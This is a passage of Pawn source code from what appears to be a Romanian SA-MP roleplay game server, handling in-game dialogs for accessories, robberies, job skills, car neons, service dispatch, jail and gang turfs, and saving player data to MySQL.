    				SetPlayerAttachedObject(playerid, 2, mask_obj[listitem-2], 2, -0.0350, -0.0099, -0.0070, -99.9998, -32.2000, 81.3999, 1.0000, 1.0000, 1.0000);
    				SCMf(playerid, COLOR_WHITE, "Ti-ai pus maska #%d pe fata.", listitem-1);
    			}
    			case 9: {
    				SetPlayerAttachedObject(playerid, 2, 11704, 2, 0.0760, 0.0989, -0.0130, 174.2000, 98.8000, 0.0000, 0.3760, 1.0000, 0.4790);
    				SendClientMessage(playerid, COLOR_WHITE, "Ti-ai pus maska speciala de halloween.");
    			}	
    			case 10: {
    				SetPlayerAttachedObject(playerid, 5, 321, 6, 0.0320, 0.0100, -0.1719, 0.0000, 0.0000, 0.0000, 1.0000, 1.0000, 1.0000);
    				SendClientMessage(playerid, COLOR_WHITE, "Ti-ai pus dildo in mana.");
    			}
    			case 11: {
    				SetPlayerAttachedObject(playerid, 2, 1242, 1, 0.0429, 0.0269, 0.0030, 0.0000, 89.0999, 0.0000, 1.8389, 2.2310, 1.7300);
    				SendClientMessage(playerid, COLOR_WHITE, "Ti-ai pus armura pe tine.");
    			}
    			case 12: {
    				SetPlayerAttachedObject(playerid, 8, 2406, 1, -0.0210, -0.0949, 0.0000, 0.0000, 86.0000, 0.0000, 1.0000, 1.0000, 1.0000);
    				SendClientMessage(playerid, COLOR_WHITE, "Ti-ai pus placa de surf pe tne.");
    			}
    		}
    	}
    	case DIALOG_LASERS: {
    		if(!response)
    			return true;

    		if(listitem==6) {
    			RemovePlayerAttachedObject(playerid, 5);
    			SendClientMessage(playerid, COLOR_LGREEN, "Laser OFF!");
    			return true;
    		}

    		if(!PlayerInfo[playerid][pLasers][listitem])
    			return true;

    		SCMf(playerid, COLOR_WHITE, "Ti-ai pus %s laser in mana.", laser_color[listitem]);
    		new const lasers[] = {19081, 19084, 18643, 19080, 19082, 19083};
    		SetPlayerAttachedObject(playerid, 5, lasers[listitem], 6, 0.0729, 0.0179, 0.0250, 17.5000, -109.2000, -1.3999, 1.0000, 1.0000, 1.0000);
    	}
    	case DIALOG_SHARD: {
    		if(!response)
    			return true;

    		new const _x[] = {444, 531, 444};
    		format(gString, 60, "~r~%d~w~~h~/~r~4 ~w~~h~shardens", PlayerInfo[playerid][pShard][listitem]);

    		PlayerTextDrawSetString(playerid, ShardPTD[0], gString);
    		PlayerTextDrawShow(playerid, ShardPTD[0]);
    		for(new i=1;i<=4;i++) {
    			TextDrawShowForPlayer(playerid, ShardTD[i-1]);
    			PlayerTextDrawSetPreviewModel(playerid, ShardPTD[i], PlayerInfo[playerid][pShard][listitem]>=i?(_x[listitem]):(-1));
    			PlayerTextDrawShow(playerid, ShardPTD[i]);
    		}
    		SelectTextDraw(playerid, 0xFF5B5BFF);
  			player_selected[playerid] = 16;
  			listitemmm[playerid] = listitem;
    	}
    	case DIALOG_ROBINVITE: {
    		if !response *then
    			return true;
    		
    		new id = strval(inputtext);
    		if !IsPlayerConnected(id) *then
    			return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

    		if !IsPlayerLogged(id) *then
    			return SendClientMessage(playerid, COLOR_GREY, "Player not logged.");

    		if(id == playerid) return true;

    		if(!ProxDetectorS(10.0, playerid, id))
    			return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este langa tine.");

    		rob_invite[playerid] = id;
    		SendClientMessage(playerid, 0xF7D2D2FF, "Rob:");
    		SCMf(playerid, 0xF7D2D2FF, "L-ai invitat pe %s sa faca rob cu tine.", GetName(id));
    		SendClientMessage(id, 0xF7D2D2FF, "Rob:");
    		SCMf(id, 0xF7D2D2FF, "%s te-a invitat sa faci rob cu el (/accept rob %d).", GetName(playerid), playerid);
    	}
    	case DIALOG_ROB: {
    		if(!response)
    			return true;

    		if(!listitem)
    			return ShowPlayerDialog(playerid, DIALOG_ROBINVITE, DIALOG_STYLE_INPUT, "Invite Rob", "Scrie ID-ul jucatorului pentru a-l invita.", "Select", "Back");

			new _x = p_rob[playerid][r_actor] = random(sizeof rob_actor_pos);
			p_rob[playerid][r_backs] = 0;
			p_rob[playerid][r_role] = true;

			new const _bizz[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 18};
			new _r = p_rob[playerid][r_biz_type] = _bizz[random(sizeof _bizz)], _rtx = _r!=18?_r:9;
			p_rob[playerid][r_biz_id] = BizzTypeID[_bizz[_rtx]][random(GpsBizzType[_bizz[_rtx]])];

    		SCMf(playerid, -1, "{47A028}(Rob) {FFFFFF}Du-te la checkpoint-ul marcat de pe mapa pentru a primi toate lucrurile de care ai nevoie. (%.1fm)", GetPlayerDistanceFromPoint(playerid, rob_actor_pos[_x][0], rob_actor_pos[_x][1], rob_actor_pos[_x][2]));
    		SetPlayerCheckpoint(playerid,rob_actor_pos[_x][0], rob_actor_pos[_x][1], rob_actor_pos[_x][2], 2.0);
    		CP[playerid] = 730;
    	}
    	case DIALOG_SKILLUPGRADE: {
    		if(!response)
    			return true;

    		if(listitem>4) return true;
    		new const _x[5] = {1, 2, 11, 9, 3}, _jName[5][] = {"Farmer", "Trucker", "Fisher", "Pizza Boy", "Lumberjack"};
    		if(PlayerInfo[playerid][pJobSkill][_x[listitem]] < 6)
    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de skill 6 la acel job pentru a achizitiona skill 6+!");

    		if(PlayerInfo[playerid][pJobSkill][_x[listitem]] == 7)
    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja aceasta optiune achizitionata!");

    		if(PlayerInfo[playerid][pBPoints] < 6969)
    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai suficiente BPoints!");

			PlayerInfo[playerid][pBPoints] -= 6969;
			PlayerInfo[playerid][pJobSkill][_x[listitem]] = 7;
			//printf(_x[listitem]);
			//printf(_x);
			SCMf(playerid, COLOR_YELLOW, "Congratulations! You have bought 'skill plus' for job %s. (-6969 BPoints)", _jName[listitem]);

			UpdateVar(playerid, "BPoints", PlayerInfo[playerid][pBPoints]);
			gQuery[0] = (EOS);
			mysql_format(SQL, gQuery, sizeof gQuery, "UPDATE `users` SET `job_skills` = '%i %i %i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `id` = '%i'",
				PlayerInfo[playerid][pJobSkill][0], PlayerInfo[playerid][pJobSkill][1], PlayerInfo[playerid][pJobSkill][2], PlayerInfo[playerid][pJobSkill][3],
				PlayerInfo[playerid][pJobSkill][4], PlayerInfo[playerid][pJobSkill][5], PlayerInfo[playerid][pJobSkill][6], PlayerInfo[playerid][pJobSkill][7],
				PlayerInfo[playerid][pJobSkill][8], PlayerInfo[playerid][pJobSkill][9], PlayerInfo[playerid][pJobSkill][10], PlayerInfo[playerid][pJobSkill][11],
				PlayerInfo[playerid][pJobSkill][12], PlayerInfo[playerid][pJobSkill][13], PlayerInfo[playerid][pJobSkill][14], PlayerInfo[playerid][pJobSkill][15],
			PlayerInfo[playerid][pJobSkill][16], PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, gQuery);	
    	}
    	case DIALOG_CHANGENEON: {
    		if(!response)
    			return true;

    		switch(listitemmm[playerid]=listitem) {
    			case 0: ShowPlayerDialog(playerid, DIALOG_CHANGENEON_, DIALOG_STYLE_LIST, "Change left neon", "{FFFFFF}White\n{ff00c9}Pink\n{fff000}Yellow\n{64ff00}Green\n{0046ff}Blue\n{ff0400}Red", "Select", "back");
    			case 1: ShowPlayerDialog(playerid, DIALOG_CHANGENEON_, DIALOG_STYLE_LIST, "Change right neon", "{FFFFFF}White\n{ff00c9}Pink\n{fff000}Yellow\n{64ff00}Green\n{0046ff}Blue\n{ff0400}Red", "Select", "back");
    			case 2: {
    				new idd = PersonalCar(playerid);
    				if(idd==-1) return true;
    				CarInfo[idd][cNeonObj_][0] = CarInfo[idd][cNeonObj_][1] = 18647;
    				mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `NeonObj` = '%i %i' WHERE `ID` = '%i'", CarInfo[idd][cNeonObj_][0], CarInfo[idd][cNeonObj_][1], CarInfo[idd][cID]);
    				mysql_tquery(SQL, gQuery);
    				if(CarInfo[idd][cNeon] != 0) {
		    			DestroyDynamicObject(CarInfo[idd][cNeonObj][0]); CarInfo[idd][cNeonObj][0] = INVALID_OBJECT_ID;
		    			DestroyDynamicObject(CarInfo[idd][cNeonObj][1]); CarInfo[idd][cNeonObj][1] = INVALID_OBJECT_ID;
		    		}
		    		AttachNeon(idd);
    				SendClientMessage(playerid, 0xFFADADFF, "Updated changes!");
    				return true;
    			}
    		}    	
    	}
    	case DIALOG_CHANGENEON_: {
    		if(!response)
    			return true;

			new idd = PersonalCar(playerid);
			if(idd==-1) return true;
			new const neonObj[7] = {18652, 18651, 18650, 18649, 18648, 18647, 18647};
			CarInfo[idd][cNeonObj_][listitemmm[playerid]] = neonObj[listitem];
			mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `NeonObj` = '%i %i' WHERE `ID` = '%i'", CarInfo[idd][cNeonObj_][0], CarInfo[idd][cNeonObj_][1], CarInfo[idd][cID]);
			mysql_tquery(SQL, gQuery);
			if(CarInfo[idd][cNeon] != 0) {
    			DestroyDynamicObject(CarInfo[idd][cNeonObj][0]); CarInfo[idd][cNeonObj][0] = INVALID_OBJECT_ID;
    			DestroyDynamicObject(CarInfo[idd][cNeonObj][1]); CarInfo[idd][cNeonObj][1] = INVALID_OBJECT_ID;
    		}
    		AttachNeon(idd);
    		SendClientMessage(playerid, 0xFFADADFF, "Updated changes!");
    	}
    	case DIALOG_GETHIT: {
    		if(!response)
    			return true;

    		PlayerHit[playerid] = SelectedPlayers[playerid][listitem];
			format(gString, 180, "HA Dispatch: Hitman %s (%d) a preluat un nou contract pentru suma de %d$.", GetName(playerid), playerid, HeadValue[PlayerHit[playerid]]);
			SendFactionMessage(11, COLOR_LIGHTBLUE, gString);
    	}
    	case DIALOG_SERVICE: {
    		if(!response)
    			return true;

    		new Float: pos_x, Float: pos_y, Float: pos_z;
			GetPlayerPos(playerid, pos_x, pos_y, pos_z);

			if(Iter_Contains(servicePlayers<listitem>, playerid)) 
				return SendClientMessage(playerid, -1, "Ai apelat deja, asteapta un raspuns.");

			switch(listitem) {
				case 0: {
					if(PlayerInfo[playerid][pMember]==12)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi serviciile factiuni tale!");
		
					format(gString, 180, "Taxi Dispatch: %s (%d) are nevoie de un taximetrist. Acesta se afla in zona %s.", GetName(playerid), playerid, Get3DZone(pos_x, pos_y, pos_z));
					SendFactionMessage(12, 0x2C6CBFFF, gString);		
					SendClientMessage(playerid, COLOR_WHITE, "Ai apelat la serviciul de taximetristi. Asteapta un raspuns!");
				}
				case 1: {
					if(PlayerInfo[playerid][pMember]==15)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi serviciile factiuni tale!");
					
					format(gString, 180, "Uber Dispatch: %s (%d) are nevoie de un Uber. Acesta se afla in zona %s.", GetName(playerid), playerid, Get3DZone(pos_x, pos_y, pos_z));
					SendFactionMessage(15, 0x2C6CBFFF, gString);
					SendClientMessage(playerid, COLOR_WHITE, "Ai apelat la serviciul de Uber. Asteapta un raspuns!");
				}
				case 2: {
					if(PlayerInfo[playerid][pMember]==23)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi serviciile factiuni tale!");
					
					format(gString, 180, "Yango Dispatch: %s (%d) are nevoie de un Yango. Acesta se afla in zona %s.", GetName(playerid), playerid, Get3DZone(pos_x, pos_y, pos_z));
					SendFactionMessage(23, 0x2C6CBFFF, gString);
					SendClientMessage(playerid, COLOR_WHITE, "Ai apelat la serviciul de Yango. Asteapta un raspuns!");
				}
				case 3: {
					if(PlayerInfo[playerid][pMember]==13)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi serviciile factiuni tale!");
	
					format(gString, 180, "Paramedic Dispatch: %s (%d) are nevoie de un paramedic. Acesta se afla in zona %s.", GetName(playerid),playerid, Get3DZone(pos_x, pos_y, pos_z));
					SendFactionMessage(13, COLOR_LIGHTBLUE, gString);
					SendClientMessage(playerid, COLOR_WHITE, "* Ai apelat la un medic, asteapta un raspuns.");
				}
				case 4: {
					if(PlayerInfo[playerid][pMember]==8)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi serviciile factiuni tale!");

					format(gString, 180, "TTC Dispatch: %s (%d) are nevoie de un mecanic. Acesta se afla in zona %s.", GetName(playerid),playerid, Get3DZone(pos_x, pos_y, pos_z));
					SendFactionMessage(8, COLOR_LIGHTBLUE, gString);
					SendClientMessage(playerid, COLOR_WHITE, "* Ai apelat la un mecanic, asteapta un raspuns.");		
				}
				case 5: {
					if(PlayerInfo[playerid][pMember]==7)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi serviciile factiuni tale!");

					format(gString, 180, "SI Dispatch: %s (%d) are nevoie de un instructor. Acesta se afla in zona %s.", GetName(playerid),playerid, Get3DZone(pos_x, pos_y, pos_z));
					SendFactionMessage(7, COLOR_LIGHTBLUE, gString);
					SendClientMessage(playerid, COLOR_WHITE, "* Ai apelat la un instructor, asteapta un raspuns.");
				}
				case 6: {
					if(PlayerInfo[playerid][pMember]==24)
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi serviciile factiuni tale!");

					format(gString, 180, "SP Dispatch: %s (%d) are nevoie de un Special Guard. Acesta se afla in zona %s.", GetName(playerid),playerid, Get3DZone(pos_x, pos_y, pos_z));
					SendFactionMessage(24, COLOR_LIGHTBLUE, gString);
					SendClientMessage(playerid, COLOR_WHITE, "* Ai apelat la un special guards, asteapta un raspuns.");
				}
			}
			Iter_Add(servicePlayers<listitem>, playerid);
			DeelayCommand[playerid][3] = gettime()+(60*3);
    	}
    	case CHOSE_BUSROUTE: {
    		if(!response)
    			return stopWork(playerid);

    		nameobject[JobVehicle[playerid]] = CreateDynamicObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
    		switch(listitem) {
    			case 0: SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}You have selected route #1 with 19 checkpoints. Follow the checkpoints."), SetPlayerRaceCheckpoint(playerid, 0, routeSelect1[0][0], routeSelect1[0][1], routeSelect1[0][2], routeSelect1[1][0], routeSelect1[1][1], routeSelect1[1][2], 5.0), SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Bank LV", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1);
    			case 1: SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}You have selected route #2 with 22 checkpoints. Follow the checkpoints."), SetPlayerRaceCheckpoint(playerid, 0, routeSelect2[0][0], routeSelect2[0][1], routeSelect2[0][2], routeSelect2[1][0], routeSelect2[1][1], routeSelect2[1][2], 5.0), SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Dealership", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1);
    			case 2: SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}You have selected route #3 with 20 checkpoints. Follow the checkpoints."), SetPlayerRaceCheckpoint(playerid, 0, routeSelect3[0][0], routeSelect3[0][1], routeSelect3[0][2], routeSelect3[1][0], routeSelect3[1][1], routeSelect3[1][2], 5.0), SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Rent Car", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1);
    		}
    		
			AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
    		route_selected[playerid] = (listitem+1);
    		CP[playerid] = 310+(listitem*30);
    	}
    	case DIALOG_CGIFT: {
			if(!response)
				return true;

			if(playerid!=Selected[playerid][listitem][0])
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti colecta acest cadou deoarece nu iti apartine.");

			SendClientMessage(playerid, COLOR_WHITE, "");
			SendClientMessage(playerid, COLOR_YELLOW, "Ai colectat cadoul si ai primit:");
			SCMf(playerid, COLOR_YELLOW, "> $%s", FormatNumber(give_arrow[playerid] * 15000));
			GivePlayerCash(playerid, give_arrow[playerid] * 1000);

			new amount;
			for(new i=0;i<3;i++) if(air_Top[i]==playerid) {
				switch(i) {
					case 0: amount=RandomEx(1,20), SCMf(playerid, COLOR_YELLOW, "> %d premium points.", amount), PlayerInfo[playerid][pPremiumPoints]+=amount,UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
					case 1: amount=RandomEx(1,300), SCMf(playerid, COLOR_YELLOW, "> %d BPoints.", amount), PlayerInfo[playerid][pBPoints]+=amount, UpdateVar(playerid, "BPoints", PlayerInfo[playerid][pBPoints]);
					case 2: amount=RandomEx(1,5), SCMf(playerid, COLOR_YELLOW, "> %d Respect Points.", amount), PlayerInfo[playerid][pExp]+=amount,UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
				}
				break;
			}
			collectGift[playerid] = false;
			Iter_Remove(drop_prize, playerid);
			RemovePlayerMapIcon(playerid, 12);
			if(Iter_IsEmpty(drop_prize)) {
				DestroyObject(gift_collect);
				DestroyDynamic3DTextLabel(gift_collect_text);
			}
		}
    	case DIALOG_JAIL: {
			if(!response) 
				return 1;

			if(PlayerInfo[playerid][pJailTime] < 1) 
				return 1;

			switch(listitem) {
				case 0: {
					if(PlayerToPoint(50.0, playerid, -34.6773,2506.8154,17.2725)) 
						return SendClientMessage(playerid, COLOR_GRAD3, "Esti deja in curtea inchisorii!");

					if(GetPlayerCash(playerid) < 30000) 
						return SendClientMessage(playerid, COLOR_GRAD3, "Nu ai suma necesara de bani!");

					SetPlayerPos(playerid, -34.6773,2506.8154,17.2725);
					SetPlayerVirtualWorld(playerid, 1339);
					GivePlayerCash(playerid, -30000);
					SendClientMessage(playerid, COLOR_GRAD3, "Ai platit $30,000 pentru a intra in curtea inchisorii!");
				}
				case 1: {
					if(GetPlayerCash(playerid) < 350000) 
						return SendClientMessage(playerid, COLOR_GRAD3, "Nu ai suma necesara de bani!");

					PlayerInfo[playerid][pJailTime] = 1;
					PlayerInfo[playerid][pJailed] = 1;
					GivePlayerCash(playerid, -350000);
					SendClientMessage(playerid, COLOR_GRAD3, "Ai platit $350,000 pentru a iesi din inchisoare!");
				}
			}
		}		
		case DIALOG_ESCAPE: {
			if(!response) 
				return 1;

			if(PlayerInfo[playerid][pJailTime] < 60*5) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Nu mai poti evada deoarece mai ai de stat 5 minute.");

			if(temp_work[playerid]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Foloseste /stopwork pentru a putea evada!");

			PlayerInfo[playerid][pEscapePoints] -= 10;
			UpdateVar(playerid, "EscapePoints", PlayerInfo[playerid][pEscapePoints]);
			Escape[playerid] = 1;
			EscapeProces[playerid] = 0;
			PlayerTextDrawSetString(playerid, InfosTD, "Foloseste comanda ~y~/hit~w~~h~ pentru a sparge usa.");
			PlayerTextDrawShow(playerid, InfosTD);	
		}
    	case DIALOG_TOGTURFS: {
    		if(!response)
    			return true;

	    	switch(listitem) {
	    		case 0: {
	    			if(togClanTurf[playerid])
    					return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti avea mai multe optiuni active pentru evitarea problemelor.");

		    		if(TurfsDisp[playerid] == 0) {
						TurfsDisp[playerid] = 1;
						SendClientMessage(playerid, COLOR_LGREEN, "Gang Turfs: Enabled");
						for(new i = 1; i <= SQL_Turfs; i++) {
							switch(TurfInfo[i][zOwned]) {
								case 0: GangZoneShowForPlayer(playerid, Turfs[i], 0xFFFFFFAA); //None
								case 4: GangZoneShowForPlayer(playerid, Turfs[i], 0x0CAB3C99);
								case 5: GangZoneShowForPlayer(playerid, Turfs[i], 0x11F2F299);
								case 6: GangZoneShowForPlayer(playerid, Turfs[i], 0xFAD40099);
								case 10: GangZoneShowForPlayer(playerid, Turfs[i], 0xAB00FA99);
								case 17: GangZoneShowForPlayer(playerid, Turfs[i], 0x25252799);
								case 18: GangZoneShowForPlayer(playerid, Turfs[i], 0x1B376D99);
								case 25: GangZoneShowForPlayer(playerid, Turfs[i], 0x88421D99);
								case 26: GangZoneShowForPlayer(playerid, Turfs[i], 0x66990099);
								case 27: GangZoneShowForPlayer(playerid, Turfs[i], 0xCC330099);
							}
							if(WarInfo[i][wAttacker]) {
								switch(WarInfo[i][wAttacker]) {
									case 4: GangZoneFlashForPlayer(playerid, Turfs[i], 0x0CAB3C99);
									case 5: GangZoneFlashForPlayer(playerid, Turfs[i], 0x11F2F299);
									case 6: GangZoneFlashForPlayer(playerid, Turfs[i], 0xFAD40099);
									case 10: GangZoneFlashForPlayer(playerid, Turfs[i], 0xAB00FA99);
									case 17: GangZoneFlashForPlayer(playerid, Turfs[i], 0x25252799);
									case 18: GangZoneFlashForPlayer(playerid, Turfs[i], 0x1B376D99);
									case 25: GangZoneFlashForPlayer(playerid, Turfs[i], 0x88421D99);
									case 26: GangZoneFlashForPlayer(playerid, Turfs[i], 0x66990099);
									case 27: GangZoneFlashForPlayer(playerid, Turfs[i], 0xCC330099);
								}
							}
						}
					} else {
						SendClientMessage(playerid, COLOR_LGREEN, "Gang Turfs: Disabled");
						TurfsDisp[playerid] = 0;
						for(new i = 1; i <= SQL_Turfs; i++) GangZoneHideForPlayerEx(playerid, Turfs[i]);
					}
				}
				case 1: {
					if(TurfsDisp[playerid])
    					return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti avea mai multe optiuni active pentru evitarea problemelor.");
		    		
		    		if(!togClanTurf[playerid]) {
						togClanTurf[playerid] = true;
						for(new i = 1; i <= SQL_clanzone; i++) {
							GangZoneShowForPlayerEx(playerid, ClanTurfs[i], ClanInfo[GraffitiInfo[i][gfOwned]][clColorInt]);
							if(GraffitiInfo[i][gfAttacked]) GangZoneFlashForPlayer(playerid, ClanTurfs[i], ClanInfo[GraffitiInfo[i][gfAttacked]][clColorInt]);
						}
					} else {
						togClanTurf[playerid] = false;
						for(new i = 1; i <= SQL_clanzone; i++) GangZoneHideForPlayerEx(playerid, ClanTurfs[i]);
					}
				}
			}
    	}
    	case DIALOG_REGULAMENT: {
    		if(!response) return KickEx(playerid), SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai primit kick deoarece nu esti de acord cu regulamentul comunitatii!"), 1;
    		LoadPlayerRegister(playerid);
			player_selected[playerid] = 5;
			for(new i = 0; i < 7; i++) PlayerTextDrawShow(playerid, RegisterPTD[playerid][i]);
			for(new i = 0; i < 14; i++) TextDrawShowForPlayer(playerid, RegisterTD[i]);
			SelectTextDraw(playerid, COLOR_SERVER);
			LoginTime[playerid][0] = 2;
			LoginTime[playerid][1] = 60;
    	}
    	case DIALOG_TOWCARLOC: {
    		if(!response) {
   				if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) {
					DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
					DisablePlayerCheckpointEx(playerid);
				}
    			return true;
    		}

			SetPlayerCheckpoint(playerid, TowCarCk[listitem][0],TowCarCk[listitem][1],TowCarCk[listitem][2], 6);
			CP[playerid] = 34;
			SendClientMessage(playerid, COLOR_YELLOW, "Checkpoint setat!");
    	}
    	case DIALOG_BUYCASE: {
    		if(!response)
    			return true;

    		if(GetPlayerCash(playerid)<100000000)
    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de $100.000.000 pentru a achizitiona un 'case battle'");

    		GivePlayerCash(playerid, -100000000);
    		PlayerInfo[playerid][pCaseBattle]++;
    		UpdateVar(playerid, "CaseBattle", PlayerInfo[playerid][pCaseBattle]);
    		SendClientMessage(playerid, COLOR_LGREEN, "Felicitari! Ai achizitionat un 'case battle' si ai platit $100.000.000.");
    		SendClientMessage(playerid, COLOR_LGREEN, "INFO: Foloseste comanda (/battle) pentru a face o batalie cu un jucator.");
    	}
    	case DIALOG_EMOTES: {
    		if(!response)
    			return true;

    		listitemm[playerid] = listitem;
    		if(!PlayerInfo[playerid][pEmotes][listitem])
    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai acest tip de emotie.");

    		if(PlayerInfo[playerid][pKeyEmote][0]==listitem||PlayerInfo[playerid][pKeyEmote][1]==listitem)
    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja o emotie setata pe acesta emotie!");

    		format(gString, 128, "{F4AD42}Emotes {FFFFFF}Menu: %s", emoteInfo[listitem][emoteName]);
    		ShowPlayerDialog(playerid, DIALOG_EMOTE, DIALOG_STYLE_LIST, gString, "Set to NUM4 key\nSet to NUM6 key", "Select", "Back");
    	}
    	case DIALOG_EMOTE: {
    		if(!response)
    			return showEmotes(playerid);

    		new i = listitemm[playerid];
    		switch(listitem) {
    			case 0: {
    				SCMf(playerid, 0xFFADADFF, "Emotia '%s' (id: %d) a fost setata cu succes pe tasta NUM4.", emoteInfo[i][emoteName], emoteInfo[i][emoteObject]);
    				PlayerInfo[playerid][pKeyEmote][0] = i;
    				UpdateVar(playerid, "KeyEmote1", PlayerInfo[playerid][pKeyEmote][0]);
    			}
    			case 1: {
    				SCMf(playerid, 0xFFADADFF, "Emotia '%s' (id: %d) a fost setata cu succes pe tasta NUM6.", emoteInfo[i][emoteName], emoteInfo[i][emoteObject]);
    				PlayerInfo[playerid][pKeyEmote][1] = i;
    				UpdateVar(playerid, "KeyEmote2", PlayerInfo[playerid][pKeyEmote][1]);
    			}
    		}
    		save_emotes(playerid);
    	}
    	case DIALOG_EAT: {
    		if(!response)
    			return true;

    		if(PlayerInfo[playerid][pHunger][listitem]<=0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu mai ai acest tip de mancare");
    		new Float:health; GetPlayerHealth(playerid, health);
    		if(health>80.0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare:Ai prea multa viata.");
    		PlayerInfo[playerid][pHunger][listitem]--;
    		save_hunger(playerid);
    		switch(listitem) {
    			case 0: PlayerTextDrawSetString(playerid, HungreyTD, "eating ~y~soup...~n~~g~+10% ~w~~h~health"), SetPlayerHealthEx(playerid, health+10.0>100.0?100.0:health+10.0), CheckMission(playerid, 42);
    			case 1: PlayerTextDrawSetString(playerid, HungreyTD, "eating ~y~pizza...~n~~g~+15% ~w~~h~health"), SetPlayerHealthEx(playerid, health+15.0>100.0?100.0:health+15.0), CheckMission(playerid, 41);
    			case 2: PlayerTextDrawSetString(playerid, HungreyTD, "eating ~y~tuna...~n~~g~+20% ~w~~h~health"), SetPlayerHealthEx(playerid, health+20.0>100.0?100.0:health+20.0), CheckMission(playerid, 42);
    			case 3: PlayerTextDrawSetString(playerid, HungreyTD, "eating ~y~steak...~n~~g~+25% ~w~~h~health"), SetPlayerHealthEx(playerid, health+25.0>100.0?100.0:health+25.0), CheckMission(playerid, 42);
    			case 4: PlayerTextDrawSetString(playerid, HungreyTD, "eating ~y~burger...~n~~g~+30% ~w~~h~health"), SetPlayerHealthEx(playerid, health+30.0>100.0?100.0:health+30.0), CheckMission(playerid, 40);
    		}
    		PlayerTextDrawShow(playerid, HungreyTD);
    		ApplyAnimation(playerid, "FOOD", "EAT_Burger",4.1,0,1,1,0,0);
    		hideHungry[playerid] = gettime()+5;
    	}
		case DIALOG_EDITFACTION: {
			if(!response)
				return true;

			new f = listitemm[playerid];
			switch(listitem) {
				case 0: ShowPlayerDialog(playerid, DIALOG_EDITFACTION1, DIALOG_STYLE_INPUT, "Edit Faction Name:", "Insert factiune name:", "Done", "Close");
				case 1: {
					GetPlayerPos(playerid, DynamicFactions[f][extX],DynamicFactions[f][extY],DynamicFactions[f][extZ]);
					updateFaction(f, true);

					format(gString, 256, "(Faction System) {FFFFFF}Admin %s a mutat cordonatele factiuni %s (ID: %d).", GetName(playerid), DynamicFactions[f][fName], f);
					SendAdminMessage(COLOR_PURPLE, gString, 5);

					mysql_format(SQL, gString, 256, "UPDATE `factions` SET `X` = '%f', `Y` = '%f', `Z` = '%f' WHERE `ID` = '%i'",
						DynamicFactions[f][extX],DynamicFactions[f][extY],DynamicFactions[f][extZ],DynamicFactions[f][fID]);
					mysql_tquery(SQL, gString);
				}
				case 2: {
					GetPlayerPos(playerid, DynamicFactions[f][svfX],DynamicFactions[f][svfY],DynamicFactions[f][svfZ]);
					updateFaction(f, true);

					format(gString, 256, "(Faction System) {FFFFFF}Admin %s a mutat cordonatele (SVF) factiuni %s (ID: %d).", GetName(playerid), DynamicFactions[f][fName], f);
					SendAdminMessage(COLOR_PURPLE, gString, 5);

					mysql_format(SQL, gString, 256, "UPDATE `factions` SET `sX` = '%f', `sY` = '%f', `sZ` = '%f' WHERE `ID` = '%i'",
						DynamicFactions[f][svfX],DynamicFactions[f][svfY],DynamicFactions[f][svfZ],DynamicFactions[f][fID]);
					mysql_tquery(SQL, gString);
				}
				case 3: { 
					switch(f) {
						case 1,2,3,14,19: format(gString, 180, "Type\tRaport Rank 1 - 7\nRunners\t%d/%d/%d/%d/%d/%d/%d\nTickets\t%d/%d/%d/%d/%d/%d/%d\nLicense Confiscated\t%d/%d/%d/%d/%d/%d/%d", 
							FactionRaport[f][1][0], FactionRaport[f][2][0], FactionRaport[f][3][0], FactionRaport[f][4][0], FactionRaport[f][5][0], FactionRaport[f][6][0], FactionRaport[f][7][0],
							FactionRaport[f][1][1], FactionRaport[f][2][1], FactionRaport[f][3][1], FactionRaport[f][4][1], FactionRaport[f][5][1], FactionRaport[f][6][1], FactionRaport[f][7][1],
